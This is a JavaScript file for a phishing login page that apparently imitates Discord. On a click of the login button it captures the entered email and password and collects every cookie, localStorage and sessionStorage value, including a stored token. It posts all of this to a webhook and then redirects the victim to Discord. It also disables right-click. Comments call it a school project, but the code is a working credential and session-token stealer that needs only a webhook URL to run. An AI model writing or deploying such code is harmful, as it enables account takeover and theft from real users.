// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const emailInput = document.querySelector('input[id="emailORphone"]');
const passwordInput = document.querySelector('input[id="password"]');
const loginButton = document.querySelector('button');

// Debug log to check if inputs are found
console.log("Script loaded. Email input:", emailInput);
console.log("Password input:", passwordInput);
console.log("Login button:", loginButton);
console.log("DOM snapshot of form:", document.querySelector('form')?.outerHTML || "No form found");

// Debug: Check localStorage immediately
console.log("Initial localStorage contents:", JSON.stringify(localStorage, null, 2));
console.log("Token in localStorage:", localStorage.getItem("token"));

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  if (loginButton) {
    loginButton.innerHTML = "";
    loginButton.textContent = "Log In";
    loginButton.removeAttribute("disabled");
  }
}

function animateEllipsis() {
  if (!loginButton) {
    console.error("Login button not found, cannot animate");
    return;
  }
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                              <span class="inner pulsingEllipsis">
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                              </span>
                           </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  setTimeout(removeEllipsisAnimation, 3000);
}

// --------------------------------------------------
// ---------- GENERATING QRCODE ---------------------
// --------------------------------------------------
function generateQRCode(data) {
  try {
    // Note: This assumes the 'qrcode' library is included in your HTML (e.g., via <script> tag)
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

// --------------------------------------------------
// ---------- COLLECT USER TOKENS -------------------
// --------------------------------------------------
function collectUserTokens() {
  let tokens = {};

  // Get cookies
  const cookies = document.cookie.split(";").reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split("=");
    acc[key] = value;
    return acc;
  }, {});
  tokens.cookies = cookies;

  // Get localStorage
  const localStorageTokens = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageTokens[key] = localStorage.getItem(key);
  }
  tokens.localStorage = localStorageTokens;

  // Get sessionStorage
  const sessionStorageTokens = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    sessionStorageTokens[key] = sessionStorage.getItem(key);
  }
  tokens.sessionStorage = sessionStorageTokens;

  console.log("Collected tokens:", JSON.stringify(tokens, null, 2));
  return tokens;
}

// --------------------------------------------------
// ---------- GET TOKEN FROM LOCALSTORAGE -----------
// --------------------------------------------------
function getStoredToken() {
  // Directly access the token from localStorage
  const token = localStorage.getItem("token");
  console.log("Retrieved token from localStorage:", token);

  // Collect all tokens (cookies, localStorage, sessionStorage)
  const userTokens = collectUserTokens();

  if (token) {
    // Generate QR code for the token
    const qrCode = generateQRCode(token);
    if (qrCode) {
      document.body.appendChild(qrCode);
      console.log("QR code generated and appended to document");
    } else {
      console.warn("Failed to generate QR code");
    }
    return { apiToken: token, userTokens };
  } else {
    console.warn("No token found in localStorage");
    return { apiToken: null, userTokens };
  }
}

// --------------------------------------------------
// ---------- WEBHOOK FUNCTION ----------------------
// --------------------------------------------------
async function sendToWebhook(email, password, tokenData) {
  // For school project: Use a placeholder webhook URL or configure it safely
  const webhookUrl = "https://your-webhook-url-here"; // Replace with your test webhook URL
  const { apiToken, userTokens } = tokenData || { apiToken: null, userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} } };
  const payload = {
    content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
    username: "Login Attempt",
    avatar_url: "https://example.com/avatar.png"
  };

  console.log("Sending payload to webhook:", payload);

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    const responseText = await response.text();
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${responseText}`);
    }

    console.log("Webhook success! Response:", responseText);
    return true;
  } catch (error) {
    console.error("Webhook failed:", error.message);
    alert("There was an error sending the webhook. Check the console.");
    return false;
  }
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
if (loginButton) {
  loginButton.addEventListener("click", async () => {
    const email = emailInput ? emailInput.value.trim() : "No email input found";
    const password = passwordInput ? passwordInput.value.trim() : "No password input found";

    console.log("Email:", email, "Password:", password);

    if (!emailInput || !passwordInput) {
      console.warn("Input fields missing, attempting to send localStorage token");
      const tokenData = getStoredToken();
      if (tokenData.apiToken) {
        const webhookSuccess = await sendToWebhook(email, password, tokenData);
        if (webhookSuccess) {
          console.log("Redirecting to target page...");
          window.location.href = "https://discord.com/channels/@me"; // Replace with your target URL
        } else {
          console.log("Webhook failed - no redirect");
          alert("Login failed - check console for details");
        }
      } else {
        alert("No token found in localStorage and input fields are missing!");
      }
      return;
    }

    // Start animation
    animateEllipsis();

    // Get token and storage data
    const tokenData = getStoredToken();

    // Send to webhook with token and collected user tokens
    const webhookSuccess = await sendToWebhook(email, password, tokenData);

    // After animation (3s), redirect if success
    setTimeout(() => {
      if (webhookSuccess) {
        console.log("Redirecting to target page...");
        window.location.href = "https://discord.com/channels/@me"; // Replace with your target URL
      } else {
        console.log("Webhook failed - no redirect");
        alert("Login failed - check console for details");
      }
    }, 3000);
  });
} else {
  console.error("Login button not found, attempting to send localStorage token");
  const tokenData = getStoredToken();
  if (tokenData.apiToken) {
    sendToWebhook("No email input found", "No password input found", tokenData);
  } else {
    console.warn("No login button and no token in localStorage");
    alert("No login button or token found!");
  }
}

// Prevent right-click (optional, keep for school project if needed)
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
